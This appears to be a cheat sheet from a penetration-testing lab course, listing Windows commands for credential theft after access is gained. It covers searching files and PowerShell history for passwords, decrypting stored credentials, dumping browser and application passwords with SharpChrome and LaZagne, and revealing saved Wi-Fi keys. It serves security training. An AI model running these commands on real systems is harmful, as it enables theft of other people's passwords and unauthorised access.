## Credential Theft

| **Command** | **Description** |
| --------------|-------------------|
| `findstr /SIM /C:"password" *.txt *ini *.cfg *.config *.xml` |Search for files with the phrase "password"|
| `gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' \| Select-String password` |Searching for passwords in Chrome dictionary files|
| `(Get-PSReadLineOption).HistorySavePath` |Confirm PowerShell history save path|
| `gc (Get-PSReadLineOption).HistorySavePath` |Reading PowerShell history file|
| `$credential = Import-Clixml -Path 'C:\scripts\pass.xml'` |Decrypting PowerShell credentials|
| `cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt` |Searching file contents for a string|
| `findstr /si password *.xml *.ini *.txt *.config` |Searching file contents for a string|
| `findstr /spin "password" *.*` |Searching file contents for a string|
| `select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password` |Search file contents with PowerShell|
| `dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*` |Search for file extensions|
| `where /R C:\ *.config` |Search for file extensions|
| `Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore` |Search for file extensions using PowerShell|
| `cmdkey /list` | List saved credentials |
| `.\SharpChrome.exe logins /unprotect` | Retrieve saved Chrome credentials |
| `.\lazagne.exe -h` | View LaZagne help menu |
| `.\lazagne.exe all` | Run all LaZagne modules |
| `Invoke-SessionGopher -Target WINLPE-SRV01` | Running SessionGopher |
| `netsh wlan show profile` | View saved wireless networks |
| `netsh wlan show profile ilfreight_corp key=clear` | Retrieve saved wireless passwords |
